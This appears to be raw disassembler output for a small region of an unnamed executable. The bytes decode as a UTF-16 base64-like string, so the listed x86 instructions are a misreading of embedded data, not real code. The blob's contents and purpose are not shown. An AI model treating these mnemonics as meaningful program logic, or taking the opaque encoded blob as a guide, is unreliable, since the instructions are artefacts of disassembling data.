  40a45a:	65 00 74 00 73       	add    %dh,%gs:0x73(%eax,%eax,1)
  40a45f:	00 67 00             	add    %ah,0x0(%edi)
  40a462:	2b 00                	sub    (%eax),%eax
  40a464:	45                   	inc    %ebp
  40a465:	00 6a 00             	add    %ch,0x0(%edx)
  40a468:	41                   	inc    %ecx
  40a469:	00 69 00             	add    %ch,0x0(%ecx)
  40a46c:	54                   	push   %esp
  40a46d:	00 30                	add    %dh,(%eax)
  40a46f:	00 70 00             	add    %dh,0x0(%eax)
  40a472:	2b 00                	sub    (%eax),%eax
  40a474:	72 00                	jb     0x40a476
  40a476:	71 00                	jno    0x40a478
  40a478:	79 00                	jns    0x40a47a
  40a47a:	69 00 55 00 38 00    	imul   $0x380055,(%eax),%eax
  40a480:	62 00                	bound  %eax,(%eax)
  40a482:	50                   	push   %eax
  40a483:	00 39                	add    %bh,(%ecx)
  40a485:	00 46 00             	add    %al,0x0(%esi)
  40a488:	77 00                	ja     0x40a48a
  40a48a:	31 00                	xor    %eax,(%eax)
  40a48c:	42                   	inc    %edx
  40a48d:	00 63 00             	add    %ah,0x0(%ebx)
  40a490:	42                   	inc    %edx
  40a491:	00 6e 00             	add    %ch,0x0(%esi)
  40a494:	45                   	inc    %ebp
  40a495:	00 58 00             	add    %bl,0x0(%eax)
  40a498:	33 00                	xor    (%eax),%eax
  40a49a:	6b 00 62             	imul   $0x62,(%eax),%eax
  40a49d:	00 57 00             	add    %dl,0x0(%edi)
  40a4a0:	2b 00                	sub    (%eax),%eax
  40a4a2:	47                   	inc    %edi
  40a4a3:	00 65 00             	add    %ah,0x0(%ebp)
  40a4a6:	6b 00 4a             	imul   $0x4a,(%eax),%eax
  40a4a9:	00 6e 00             	add    %ch,0x0(%esi)
  40a4ac:	2f                   	das
  40a4ad:	00 56 00             	add    %dl,0x0(%esi)
  40a4b0:	65 00 32             	add    %dh,%gs:(%edx)
  40a4b3:	00 46 00             	add    %al,0x0(%esi)
  40a4b6:	4c                   	dec    %esp
  40a4b7:	00 77 00             	add    %dh,0x0(%edi)
  40a4ba:	49                   	dec    %ecx
  40a4bb:	00 70 00             	add    %dh,0x0(%eax)
  40a4be:	58                   	pop    %eax
  40a4bf:	00 61 00             	add    %ah,0x0(%ecx)
  40a4c2:	57                   	push   %edi
  40a4c3:	00 51 00             	add    %dl,0x0(%ecx)
  40a4c6:	65 00 4a 00          	add    %cl,%gs:0x0(%edx)
  40a4ca:	75 00                	jne    0x40a4cc
  40a4cc:	79 00                	jns    0x40a4ce
  40a4ce:	33 00                	xor    (%eax),%eax
  40a4d0:	76 00                	jbe    0x40a4d2
  40a4d2:	6c                   	insb   (%dx),%es:(%edi)
  40a4d3:	00 47 00             	add    %al,0x0(%edi)
  40a4d6:	75 00                	jne    0x40a4d8
  40a4d8:	68 00 61 00 2b       	push   $0x2b006100
  40a4dd:	00 58 00             	add    %bl,0x0(%eax)
  40a4e0:	66 00 4e 00          	data16 add %cl,0x0(%esi)
  40a4e4:	54                   	push   %esp
  40a4e5:	00 32                	add    %dh,(%edx)
  40a4e7:	00 7a 00             	add    %bh,0x0(%edx)
  40a4ea:	4e                   	dec    %esi
  40a4eb:	00 68 00             	add    %ch,0x0(%eax)
  40a4ee:	2f                   	das
  40a4ef:	00 4d 00             	add    %cl,0x0(%ebp)
  40a4f2:	44                   	inc    %esp
  40a4f3:	00 6e 00             	add    %ch,0x0(%esi)
  40a4f6:	52                   	push   %edx
  40a4f7:	00 61 00             	add    %ah,0x0(%ecx)
  40a4fa:	4c                   	dec    %esp
  40a4fb:	00 31                	add    %dh,(%ecx)
  40a4fd:	00 4e 00             	add    %cl,0x0(%esi)
  40a500:	4d                   	dec    %ebp
  40a501:	00 4a 00             	add    %cl,0x0(%edx)
  40a504:	59                   	pop    %ecx
  40a505:	00 69 00             	add    %ch,0x0(%ecx)
  40a508:	77 00                	ja     0x40a50a
  40a50a:	38 00                	cmp    %al,(%eax)
  40a50c:	53                   	push   %ebx
  40a50d:	00 38                	add    %bh,(%eax)
  40a50f:	00 36                	add    %dh,(%esi)
  40a511:	00 66 00             	add    %ah,0x0(%esi)
  40a514:	67 00 61 00          	add    %ah,0x0(%bx,%di)
  40a518:	48                   	dec    %eax
  40a519:	00 45 00             	add    %al,0x0(%ebp)
  40a51c:	58                   	pop    %eax
  40a51d:	00 4f 00             	add    %cl,0x0(%edi)
  40a520:	48                   	dec    %eax
  40a521:	00 6c 00 4d          	add    %ch,0x4d(%eax,%eax,1)
  40a525:	00 54 00 4b          	add    %dl,0x4b(%eax,%eax,1)
  40a529:	00 75 00             	add    %dh,0x0(%ebp)
  40a52c:	77 00                	ja     0x40a52e
  40a52e:	47                   	inc    %edi
  40a52f:	00 32                	add    %dh,(%edx)
  40a531:	00 2f                	add    %ch,(%edi)
  40a533:	00 50 00             	add    %dl,0x0(%eax)
  40a536:	75 00                	jne    0x40a538
  40a538:	63 00                	arpl   %eax,(%eax)
  40a53a:	76 00                	jbe    0x40a53c
  40a53c:	42                   	inc    %edx
  40a53d:	00 4f 00             	add    %cl,0x0(%edi)
  40a540:	73 00                	jae    0x40a542
  40a542:	2f                   	das
  40a543:	00 5a 00             	add    %bl,0x0(%edx)
  40a546:	4b                   	dec    %ebx
  40a547:	00 76 00             	add    %dh,0x0(%esi)
  40a54a:	36 00 48 00          	add    %cl,%ss:0x0(%eax)
  40a54e:	48                   	dec    %eax
  40a54f:	00 6f 00             	add    %ch,0x0(%edi)
  40a552:	69 00 55 00 77 00    	imul   $0x770055,(%eax),%eax
  40a558:	63 00                	arpl   %eax,(%eax)
  40a55a:	64 00 75 00          	add    %dh,%fs:0x0(%ebp)
  40a55e:	6e                   	outsb  %ds:(%esi),(%dx)
  40a55f:	00 4f 00             	add    %cl,0x0(%edi)
  40a562:	6b 00 4e             	imul   $0x4e,(%eax),%eax
  40a565:	00 35 00 37 00 39    	add    %dh,0x39003700
  40a56b:	00 37                	add    %dh,(%edi)
  40a56d:	00 57 00             	add    %dl,0x0(%edi)
  40a570:	54                   	push   %esp
  40a571:	00 44 00 58          	add    %al,0x58(%eax,%eax,1)
  40a575:	00 31                	add    %dh,(%ecx)
  40a577:	00 70 00             	add    %dh,0x0(%eax)
  40a57a:	44                   	inc    %esp
  40a57b:	00 35 00 52 00 6e    	add    %dh,0x6e005200
  40a581:	00 58 00             	add    %bl,0x0(%eax)
  40a584:	59                   	pop    %ecx
  40a585:	00 6b 00             	add    %ch,0x0(%ebx)
  40a588:	53                   	push   %ebx
  40a589:	00 4d 00             	add    %cl,0x0(%ebp)
  40a58c:	34 00                	xor    $0x0,%al
  40a58e:	65 00 76 00          	add    %dh,%gs:0x0(%esi)
  40a592:	61                   	popa
  40a593:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a596:	6a 00                	push   $0x0
  40a598:	77 00                	ja     0x40a59a
  40a59a:	45                   	inc    %ebp
  40a59b:	00 70 00             	add    %dh,0x0(%eax)
  40a59e:	55                   	push   %ebp
  40a59f:	00 4e 00             	add    %cl,0x0(%esi)
  40a5a2:	68 00 48 00 72       	push   $0x72004800
  40a5a7:	00 6d 00             	add    %ch,0x0(%ebp)
  40a5aa:	42                   	inc    %edx
  40a5ab:	00 4d 00             	add    %cl,0x0(%ebp)
  40a5ae:	59                   	pop    %ecx
  40a5af:	00 51 00             	add    %dl,0x0(%ecx)
  40a5b2:	64 00 50 00          	add    %dl,%fs:0x0(%eax)
  40a5b6:	71 00                	jno    0x40a5b8
  40a5b8:	64 00 51 00          	add    %dl,%fs:0x0(%ecx)
  40a5bc:	53                   	push   %ebx
  40a5bd:	00 4e 00             	add    %cl,0x0(%esi)
  40a5c0:	2b 00                	sub    (%eax),%eax
  40a5c2:	58                   	pop    %eax
  40a5c3:	00 49 00             	add    %cl,0x0(%ecx)
  40a5c6:	33 00                	xor    (%eax),%eax
  40a5c8:	77 00                	ja     0x40a5ca
  40a5ca:	4e                   	dec    %esi
  40a5cb:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a5ce:	36 00 7a 00          	add    %bh,%ss:0x0(%edx)
  40a5d2:	42                   	inc    %edx
  40a5d3:	00 4d 00             	add    %cl,0x0(%ebp)
  40a5d6:	53                   	push   %ebx
  40a5d7:	00 32                	add    %dh,(%edx)
  40a5d9:	00 42 00             	add    %al,0x0(%edx)
  40a5dc:	39 00                	cmp    %eax,(%eax)
  40a5de:	4e                   	dec    %esi
  40a5df:	00 4c 00 62          	add    %cl,0x62(%eax,%eax,1)
  40a5e3:	00 69 00             	add    %ch,0x0(%ecx)
  40a5e6:	35 00 47 00 62       	xor    $0x62004700,%eax
  40a5eb:	00 75 00             	add    %dh,0x0(%ebp)
  40a5ee:	36 00 51 00          	add    %dl,%ss:0x0(%ecx)
  40a5f2:	75 00                	jne    0x40a5f4
  40a5f4:	7a 00                	jp     0x40a5f6
  40a5f6:	6e                   	outsb  %ds:(%esi),(%dx)
  40a5f7:	00 74 00 2f          	add    %dh,0x2f(%eax,%eax,1)
  40a5fb:	00 79 00             	add    %bh,0x0(%ecx)
  40a5fe:	2b 00                	sub    (%eax),%eax
  40a600:	76 00                	jbe    0x40a602
  40a602:	6c                   	insb   (%dx),%es:(%edi)
  40a603:	00 57 00             	add    %dl,0x0(%edi)
  40a606:	4d                   	dec    %ebp
  40a607:	00 30                	add    %dh,(%eax)
  40a609:	00 53 00             	add    %dl,0x0(%ebx)
  40a60c:	2b 00                	sub    (%eax),%eax
  40a60e:	74 00                	je     0x40a610
  40a610:	65 00 4b 00          	add    %cl,%gs:0x0(%ebx)
  40a614:	52                   	push   %edx
  40a615:	00 69 00             	add    %ch,0x0(%ecx)
  40a618:	76 00                	jbe    0x40a61a
  40a61a:	30 00                	xor    %al,(%eax)
  40a61c:	58                   	pop    %eax
  40a61d:	00 6f 00             	add    %ch,0x0(%edi)
  40a620:	76 00                	jbe    0x40a622
  40a622:	4f                   	dec    %edi
  40a623:	00 7a 00             	add    %bh,0x0(%edx)
  40a626:	6a 00                	push   $0x0
  40a628:	31 00                	xor    %eax,(%eax)
  40a62a:	6f                   	outsl  %ds:(%esi),(%dx)
  40a62b:	00 54 00 62          	add    %dl,0x62(%eax,%eax,1)
  40a62f:	00 50 00             	add    %dl,0x0(%eax)
  40a632:	4b                   	dec    %ebx
  40a633:	00 6f 00             	add    %ch,0x0(%edi)
  40a636:	6a 00                	push   $0x0
  40a638:	50                   	push   %eax
  40a639:	00 49 00             	add    %cl,0x0(%ecx)
  40a63c:	6a 00                	push   $0x0
  40a63e:	6d                   	insl   (%dx),%es:(%edi)
  40a63f:	00 41 00             	add    %al,0x0(%ecx)
  40a642:	55                   	push   %ebp
  40a643:	00 6c 00 62          	add    %ch,0x62(%eax,%eax,1)
  40a647:	00 5a 00             	add    %bl,0x0(%edx)
  40a64a:	45                   	inc    %ebp
  40a64b:	00 49 00             	add    %cl,0x0(%ecx)
  40a64e:	68 00 74 00 2f       	push   $0x2f007400
  40a653:	00 39                	add    %bh,(%ecx)
  40a655:	00 48 00             	add    %cl,0x0(%eax)
  40a658:	61                   	popa
  40a659:	00 55 00             	add    %dl,0x0(%ebp)
  40a65c:	38 00                	cmp    %al,(%eax)
  40a65e:	7a 00                	jp     0x40a660
  40a660:	79 00                	jns    0x40a662
  40a662:	52                   	push   %edx
  40a663:	00 46 00             	add    %al,0x0(%esi)
  40a666:	42                   	inc    %edx
  40a667:	00 68 00             	add    %ch,0x0(%eax)
  40a66a:	72 00                	jb     0x40a66c
  40a66c:	38 00                	cmp    %al,(%eax)
  40a66e:	2b 00                	sub    (%eax),%eax
  40a670:	46                   	inc    %esi
  40a671:	00 4a 00             	add    %cl,0x0(%edx)
  40a674:	4a                   	dec    %edx
  40a675:	00 59 00             	add    %bl,0x0(%ecx)
  40a678:	2f                   	das
  40a679:	00 6c 00 35          	add    %ch,0x35(%eax,%eax,1)
  40a67d:	00 75 00             	add    %dh,0x0(%ebp)
  40a680:	61                   	popa
  40a681:	00 48 00             	add    %cl,0x0(%eax)
  40a684:	4e                   	dec    %esi
  40a685:	00 59 00             	add    %bl,0x0(%ecx)
  40a688:	7a 00                	jp     0x40a68a
  40a68a:	37                   	aaa
  40a68b:	00 43 00             	add    %al,0x0(%ebx)
  40a68e:	2f                   	das
  40a68f:	00 50 00             	add    %dl,0x0(%eax)
  40a692:	67 00 74 00          	add    %dh,0x0(%si)
  40a696:	2f                   	das
  40a697:	00 4d 00             	add    %cl,0x0(%ebp)
  40a69a:	73 00                	jae    0x40a69c
  40a69c:	59                   	pop    %ecx
  40a69d:	00 4f 00             	add    %cl,0x0(%edi)
  40a6a0:	53                   	push   %ebx
  40a6a1:	00 79 00             	add    %bh,0x0(%ecx)
  40a6a4:	48                   	dec    %eax
  40a6a5:	00 57 00             	add    %dl,0x0(%edi)
  40a6a8:	31 00                	xor    %eax,(%eax)
  40a6aa:	59                   	pop    %ecx
  40a6ab:	00 65 00             	add    %ah,0x0(%ebp)
  40a6ae:	72 00                	jb     0x40a6b0
  40a6b0:	74 00                	je     0x40a6b2
  40a6b2:	54                   	push   %esp
  40a6b3:	00 6b 00             	add    %ch,0x0(%ebx)
  40a6b6:	6b 00 4a             	imul   $0x4a,(%eax),%eax
  40a6b9:	00 76 00             	add    %dh,0x0(%esi)
  40a6bc:	77 00                	ja     0x40a6be
  40a6be:	2f                   	das
  40a6bf:	00 35 00 37 00 46    	add    %dh,0x46003700
  40a6c5:	00 53 00             	add    %dl,0x0(%ebx)
  40a6c8:	66 00 36             	data16 add %dh,(%esi)
  40a6cb:	00 42 00             	add    %al,0x0(%edx)
  40a6ce:	61                   	popa
  40a6cf:	00 2b                	add    %ch,(%ebx)
  40a6d1:	00 66 00             	add    %ah,0x0(%esi)
  40a6d4:	37                   	aaa
  40a6d5:	00 52 00             	add    %dl,0x0(%edx)
  40a6d8:	2f                   	das
  40a6d9:	00 44 00 43          	add    %al,0x43(%eax,%eax,1)
  40a6dd:	00 78 00             	add    %bh,0x0(%eax)
  40a6e0:	41                   	inc    %ecx
  40a6e1:	00 57 00             	add    %dl,0x0(%edi)
  40a6e4:	48                   	dec    %eax
  40a6e5:	00 75 00             	add    %dh,0x0(%ebp)
  40a6e8:	4f                   	dec    %edi
  40a6e9:	00 4c 00 4b          	add    %cl,0x4b(%eax,%eax,1)
  40a6ed:	00 6b 00             	add    %ch,0x0(%ebx)
  40a6f0:	37                   	aaa
  40a6f1:	00 50 00             	add    %dl,0x0(%eax)
  40a6f4:	38 00                	cmp    %al,(%eax)
  40a6f6:	61                   	popa
  40a6f7:	00 73 00             	add    %dh,0x0(%ebx)
  40a6fa:	7a 00                	jp     0x40a6fc
  40a6fc:	4a                   	dec    %edx
  40a6fd:	00 42 00             	add    %al,0x0(%edx)
  40a700:	4a                   	dec    %edx
  40a701:	00 62 00             	add    %ah,0x0(%edx)
  40a704:	76 00                	jbe    0x40a706
  40a706:	5a                   	pop    %edx
  40a707:	00 41 00             	add    %al,0x0(%ecx)
  40a70a:	35 00 56 00 58       	xor    $0x58005600,%eax
  40a70f:	00 30                	add    %dh,(%eax)
  40a711:	00 79 00             	add    %bh,0x0(%ecx)
  40a714:	6e                   	outsb  %ds:(%esi),(%dx)
  40a715:	00 32                	add    %dh,(%edx)
  40a717:	00 56 00             	add    %dl,0x0(%esi)
  40a71a:	75 00                	jne    0x40a71c
  40a71c:	42                   	inc    %edx
  40a71d:	00 55 00             	add    %dl,0x0(%ebp)
  40a720:	78 00                	js     0x40a722
  40a722:	68 00 71 00 33       	push   $0x33007100
  40a727:	00 4e 00             	add    %cl,0x0(%esi)
  40a72a:	68 00 4f 00 50       	push   $0x50004f00
  40a72f:	00 77 00             	add    %dh,0x0(%edi)
  40a732:	39 00                	cmp    %eax,(%eax)
  40a734:	4e                   	dec    %esi
  40a735:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a738:	78 00                	js     0x40a73a
  40a73a:	30 00                	xor    %al,(%eax)
  40a73c:	32 00                	xor    (%eax),%al
  40a73e:	6b 00 73             	imul   $0x73,(%eax),%eax
  40a741:	00 66 00             	add    %ah,0x0(%esi)
  40a744:	52                   	push   %edx
  40a745:	00 72 00             	add    %dh,0x0(%edx)
  40a748:	53                   	push   %ebx
  40a749:	00 39                	add    %bh,(%ecx)
  40a74b:	00 4f 00             	add    %cl,0x0(%edi)
  40a74e:	76 00                	jbe    0x40a750
  40a750:	67 00 58 00          	add    %bl,0x0(%bx,%si)
  40a754:	6b 00 61             	imul   $0x61,(%eax),%eax
  40a757:	00 45 00             	add    %al,0x0(%ebp)
  40a75a:	4a                   	dec    %edx
  40a75b:	00 58 00             	add    %bl,0x0(%eax)
  40a75e:	55                   	push   %ebp
  40a75f:	00 4f 00             	add    %cl,0x0(%edi)
  40a762:	6a 00                	push   $0x0
  40a764:	73 00                	jae    0x40a766
  40a766:	35 00 73 00 4e       	xor    $0x4e007300,%eax
  40a76b:	00 38                	add    %bh,(%eax)
  40a76d:	00 35 00 30 00 32    	add    %dh,0x32003000
  40a773:	00 7a 00             	add    %bh,0x0(%edx)
  40a776:	68 00 39 00 56       	push   $0x56003900
  40a77b:	00 63 00             	add    %ah,0x0(%ebx)
  40a77e:	35 00 30 00 4f       	xor    $0x4f003000,%eax
  40a783:	00 45 00             	add    %al,0x0(%ebp)
  40a786:	69 00 4a 00 2f 00    	imul   $0x2f004a,(%eax),%eax
  40a78c:	6e                   	outsb  %ds:(%esi),(%dx)
  40a78d:	00 44 00 7a          	add    %al,0x7a(%eax,%eax,1)
  40a791:	00 43 00             	add    %al,0x0(%ebx)
  40a794:	79 00                	jns    0x40a796
  40a796:	31 00                	xor    %eax,(%eax)
  40a798:	39 00                	cmp    %eax,(%eax)
  40a79a:	2f                   	das
  40a79b:	00 6b 00             	add    %ch,0x0(%ebx)
  40a79e:	49                   	dec    %ecx
  40a79f:	00 41 00             	add    %al,0x0(%ecx)
  40a7a2:	63 00                	arpl   %eax,(%eax)
  40a7a4:	69 00 65 00 35 00    	imul   $0x350065,(%eax),%eax
  40a7aa:	59                   	pop    %ecx
  40a7ab:	00 30                	add    %dh,(%eax)
  40a7ad:	00 41 00             	add    %al,0x0(%ecx)
  40a7b0:	6e                   	outsb  %ds:(%esi),(%dx)
  40a7b1:	00 2b                	add    %ch,(%ebx)
  40a7b3:	00 63 00             	add    %ah,0x0(%ebx)
  40a7b6:	75 00                	jne    0x40a7b8
  40a7b8:	53                   	push   %ebx
  40a7b9:	00 4a 00             	add    %cl,0x0(%edx)
  40a7bc:	39 00                	cmp    %eax,(%eax)
  40a7be:	71 00                	jno    0x40a7c0
  40a7c0:	63 00                	arpl   %eax,(%eax)
  40a7c2:	49                   	dec    %ecx
  40a7c3:	00 51 00             	add    %dl,0x0(%ecx)
  40a7c6:	69 00 49 00 4d 00    	imul   $0x4d0049,(%eax),%eax
  40a7cc:	31 00                	xor    %eax,(%eax)
  40a7ce:	63 00                	arpl   %eax,(%eax)
  40a7d0:	51                   	push   %ecx
  40a7d1:	00 63 00             	add    %ah,0x0(%ebx)
  40a7d4:	34 00                	xor    $0x0,%al
  40a7d6:	77 00                	ja     0x40a7d8
  40a7d8:	38 00                	cmp    %al,(%eax)
  40a7da:	48                   	dec    %eax
  40a7db:	00 33                	add    %dh,(%ebx)
  40a7dd:	00 4f 00             	add    %cl,0x0(%edi)
  40a7e0:	48                   	dec    %eax
  40a7e1:	00 63 00             	add    %ah,0x0(%ebx)
  40a7e4:	6a 00                	push   $0x0
  40a7e6:	39 00                	cmp    %eax,(%eax)
  40a7e8:	6b 00 6d             	imul   $0x6d,(%eax),%eax
  40a7eb:	00 72 00             	add    %dh,0x0(%edx)
  40a7ee:	71 00                	jno    0x40a7f0
  40a7f0:	42                   	inc    %edx
  40a7f1:	00 2b                	add    %ch,(%ebx)
  40a7f3:	00 5a 00             	add    %bl,0x0(%edx)
  40a7f6:	35 00 4a 00 45       	xor    $0x45004a00,%eax
  40a7fb:	00 7a 00             	add    %bh,0x0(%edx)
  40a7fe:	38 00                	cmp    %al,(%eax)
  40a800:	36 00 73 00          	add    %dh,%ss:0x0(%ebx)
  40a804:	31 00                	xor    %eax,(%eax)
  40a806:	38 00                	cmp    %al,(%eax)
  40a808:	67 00 58 00          	add    %bl,0x0(%bx,%si)
  40a80c:	4f                   	dec    %edi
  40a80d:	00 5a 00             	add    %bl,0x0(%edx)
  40a810:	79 00                	jns    0x40a812
  40a812:	75 00                	jne    0x40a814
  40a814:	4a                   	dec    %edx
  40a815:	00 6b 00             	add    %ch,0x0(%ebx)
  40a818:	74 00                	je     0x40a81a
  40a81a:	33 00                	xor    (%eax),%eax
  40a81c:	4b                   	dec    %ebx
  40a81d:	00 42 00             	add    %al,0x0(%edx)
  40a820:	67 00 70 00          	add    %dh,0x0(%bx,%si)
  40a824:	30 00                	xor    %al,(%eax)
  40a826:	57                   	push   %edi
  40a827:	00 2f                	add    %ch,(%edi)
  40a829:	00 6a 00             	add    %ch,0x0(%edx)
  40a82c:	75 00                	jne    0x40a82e
  40a82e:	68 00 61 00 47       	push   $0x47006100
  40a833:	00 74 00 52          	add    %dh,0x52(%eax,%eax,1)
  40a837:	00 35 00 54 00 49    	add    %dh,0x49005400
  40a83d:	00 42 00             	add    %al,0x0(%edx)
  40a840:	32 00                	xor    (%eax),%al
  40a842:	79 00                	jns    0x40a844
  40a844:	66 00 78 00          	data16 add %bh,0x0(%eax)
  40a848:	4b                   	dec    %ebx
  40a849:	00 69 00             	add    %ch,0x0(%ecx)
  40a84c:	59                   	pop    %ecx
  40a84d:	00 31                	add    %dh,(%ecx)
  40a84f:	00 41 00             	add    %al,0x0(%ecx)
  40a852:	52                   	push   %edx
  40a853:	00 4a 00             	add    %cl,0x0(%edx)
  40a856:	4a                   	dec    %edx
  40a857:	00 2b                	add    %ch,(%ebx)
  40a859:	00 6d 00             	add    %ch,0x0(%ebp)
  40a85c:	50                   	push   %eax
  40a85d:	00 70 00             	add    %dh,0x0(%eax)
  40a860:	52                   	push   %edx
  40a861:	00 72 00             	add    %dh,0x0(%edx)
  40a864:	46                   	inc    %esi
  40a865:	00 49 00             	add    %cl,0x0(%ecx)
  40a868:	55                   	push   %ebp
  40a869:	00 6b 00             	add    %ch,0x0(%ebx)
  40a86c:	2b 00                	sub    (%eax),%eax
  40a86e:	56                   	push   %esi
  40a86f:	00 35 00 66 00 2b    	add    %dh,0x2b006600
  40a875:	00 4c 00 76          	add    %cl,0x76(%eax,%eax,1)
  40a879:	00 6b 00             	add    %ch,0x0(%ebx)
  40a87c:	41                   	inc    %ecx
  40a87d:	00 37                	add    %dh,(%edi)
  40a87f:	00 74 00 61          	add    %dh,0x61(%eax,%eax,1)
  40a883:	00 4d 00             	add    %cl,0x0(%ebp)
  40a886:	4b                   	dec    %ebx
  40a887:	00 37                	add    %dh,(%edi)
  40a889:	00 38                	add    %bh,(%eax)
  40a88b:	00 6a 00             	add    %ch,0x0(%edx)
  40a88e:	34 00                	xor    $0x0,%al
  40a890:	53                   	push   %ebx
  40a891:	00 74 00 52          	add    %dh,0x52(%eax,%eax,1)
  40a895:	00 62 00             	add    %ah,0x0(%edx)
  40a898:	4d                   	dec    %ebp
  40a899:	00 72 00             	add    %dh,0x0(%edx)
  40a89c:	50                   	push   %eax
  40a89d:	00 71 00             	add    %dh,0x0(%ecx)
  40a8a0:	64 00 58 00          	add    %bl,%fs:0x0(%eax)
  40a8a4:	61                   	popa
  40a8a5:	00 6e 00             	add    %ch,0x0(%esi)
  40a8a8:	2b 00                	sub    (%eax),%eax
  40a8aa:	59                   	pop    %ecx
  40a8ab:	00 76 00             	add    %dh,0x0(%esi)
  40a8ae:	42                   	inc    %edx
  40a8af:	00 63 00             	add    %ah,0x0(%ebx)
  40a8b2:	56                   	push   %esi
  40a8b3:	00 49 00             	add    %cl,0x0(%ecx)
  40a8b6:	78 00                	js     0x40a8b8
  40a8b8:	53                   	push   %ebx
  40a8b9:	00 2b                	add    %ch,(%ebx)
  40a8bb:	00 6e 00             	add    %ch,0x0(%esi)
  40a8be:	59                   	pop    %ecx
  40a8bf:	00 36                	add    %dh,(%esi)
  40a8c1:	00 6f 00             	add    %ch,0x0(%edi)
  40a8c4:	30 00                	xor    %al,(%eax)
  40a8c6:	63 00                	arpl   %eax,(%eax)
  40a8c8:	68 00 32 00 58       	push   $0x58003200
  40a8cd:	00 7a 00             	add    %bh,0x0(%edx)
  40a8d0:	30 00                	xor    %al,(%eax)
  40a8d2:	48                   	dec    %eax
  40a8d3:	00 5a 00             	add    %bl,0x0(%edx)
  40a8d6:	36 00 34 00          	add    %dh,%ss:(%eax,%eax,1)
  40a8da:	55                   	push   %ebp
  40a8db:	00 47 00             	add    %al,0x0(%edi)
  40a8de:	41                   	inc    %ecx
  40a8df:	00 31                	add    %dh,(%ecx)
  40a8e1:	00 49 00             	add    %cl,0x0(%ecx)
  40a8e4:	50                   	push   %eax
  40a8e5:	00 53 00             	add    %dl,0x0(%ebx)
  40a8e8:	6e                   	outsb  %ds:(%esi),(%dx)
  40a8e9:	00 4f 00             	add    %cl,0x0(%edi)
  40a8ec:	70 00                	jo     0x40a8ee
  40a8ee:	6e                   	outsb  %ds:(%esi),(%dx)
  40a8ef:	00 67 00             	add    %ah,0x0(%edi)
  40a8f2:	4e                   	dec    %esi
  40a8f3:	00 37                	add    %dh,(%edi)
  40a8f5:	00 6f 00             	add    %ch,0x0(%edi)
  40a8f8:	41                   	inc    %ecx
  40a8f9:	00 4e 00             	add    %cl,0x0(%esi)
  40a8fc:	6d                   	insl   (%dx),%es:(%edi)
  40a8fd:	00 68 00             	add    %ch,0x0(%eax)
  40a900:	37                   	aaa
  40a901:	00 62 00             	add    %ah,0x0(%edx)
  40a904:	37                   	aaa
  40a905:	00 56 00             	add    %dl,0x0(%esi)
  40a908:	38 00                	cmp    %al,(%eax)
  40a90a:	6f                   	outsl  %ds:(%esi),(%dx)
  40a90b:	00 4a 00             	add    %cl,0x0(%edx)
  40a90e:	35 00 4a 00 41       	xor    $0x41004a00,%eax
  40a913:	00 58 00             	add    %bl,0x0(%eax)
  40a916:	4b                   	dec    %ebx
  40a917:	00 76 00             	add    %dh,0x0(%esi)
  40a91a:	42                   	inc    %edx
  40a91b:	00 51 00             	add    %dl,0x0(%ecx)
  40a91e:	32 00                	xor    (%eax),%al
  40a920:	2f                   	das
  40a921:	00 4c 00 5a          	add    %cl,0x5a(%eax,%eax,1)
  40a925:	00 4a 00             	add    %cl,0x0(%edx)
  40a928:	35 00 32 00 68       	xor    $0x68003200,%eax
  40a92d:	00 66 00             	add    %ah,0x0(%esi)
  40a930:	78 00                	js     0x40a932
  40a932:	6e                   	outsb  %ds:(%esi),(%dx)
  40a933:	00 30                	add    %dh,(%eax)
  40a935:	00 61 00             	add    %ah,0x0(%ecx)
  40a938:	39 00                	cmp    %eax,(%eax)
  40a93a:	57                   	push   %edi
  40a93b:	00 4a 00             	add    %cl,0x0(%edx)
  40a93e:	59                   	pop    %ecx
  40a93f:	00 38                	add    %bh,(%eax)
  40a941:	00 4b 00             	add    %cl,0x0(%ebx)
  40a944:	5a                   	pop    %edx
  40a945:	00 49 00             	add    %cl,0x0(%ecx)
  40a948:	6e                   	outsb  %ds:(%esi),(%dx)
  40a949:	00 6b 00             	add    %ch,0x0(%ebx)
  40a94c:	55                   	push   %ebp
  40a94d:	00 2b                	add    %ch,(%ebx)
  40a94f:	00 69 00             	add    %ch,0x0(%ecx)
  40a952:	70 00                	jo     0x40a954
  40a954:	57                   	push   %edi
  40a955:	00 6b 00             	add    %ch,0x0(%ebx)
  40a958:	52                   	push   %edx
  40a959:	00 50 00             	add    %dl,0x0(%eax)
  40a95c:	73 00                	jae    0x40a95e
  40a95e:	49                   	dec    %ecx
  40a95f:	00 61 00             	add    %ah,0x0(%ecx)
  40a962:	7a 00                	jp     0x40a964
  40a964:	31 00                	xor    %eax,(%eax)
  40a966:	38 00                	cmp    %al,(%eax)
  40a968:	58                   	pop    %eax
  40a969:	00 6b 00             	add    %ch,0x0(%ebx)
  40a96c:	70 00                	jo     0x40a96e
  40a96e:	71 00                	jno    0x40a970
  40a970:	79 00                	jns    0x40a972
  40a972:	44                   	inc    %esp
  40a973:	00 46 00             	add    %al,0x0(%esi)
  40a976:	62 00                	bound  %eax,(%eax)
  40a978:	6f                   	outsl  %ds:(%esi),(%dx)
  40a979:	00 4e 00             	add    %cl,0x0(%esi)
  40a97c:	31 00                	xor    %eax,(%eax)
  40a97e:	6b 00 37             	imul   $0x37,(%eax),%eax
  40a981:	00 6c 00 53          	add    %ch,0x53(%eax,%eax,1)
  40a985:	00 51 00             	add    %dl,0x0(%ecx)
  40a988:	44                   	inc    %esp
  40a989:	00 6e 00             	add    %ch,0x0(%esi)
  40a98c:	32 00                	xor    (%eax),%al
  40a98e:	35 00 49 00 61       	xor    $0x61004900,%eax
  40a993:	00 6c 00 54          	add    %ch,0x54(%eax,%eax,1)
  40a997:	00 74 00 67          	add    %dh,0x67(%eax,%eax,1)
  40a99b:	00 2b                	add    %ch,(%ebx)
  40a99d:	00 6b 00             	add    %ch,0x0(%ebx)
  40a9a0:	77 00                	ja     0x40a9a2
  40a9a2:	37                   	aaa
  40a9a3:	00 52 00             	add    %dl,0x0(%edx)
  40a9a6:	59                   	pop    %ecx
  40a9a7:	00 69 00             	add    %ch,0x0(%ecx)
  40a9aa:	4b                   	dec    %ebx
  40a9ab:	00 56 00             	add    %dl,0x0(%esi)
  40a9ae:	54                   	push   %esp
  40a9af:	00 36                	add    %dh,(%esi)
  40a9b1:	00 45 00             	add    %al,0x0(%ebp)
  40a9b4:	79 00                	jns    0x40a9b6
  40a9b6:	78 00                	js     0x40a9b8
  40a9b8:	5a                   	pop    %edx
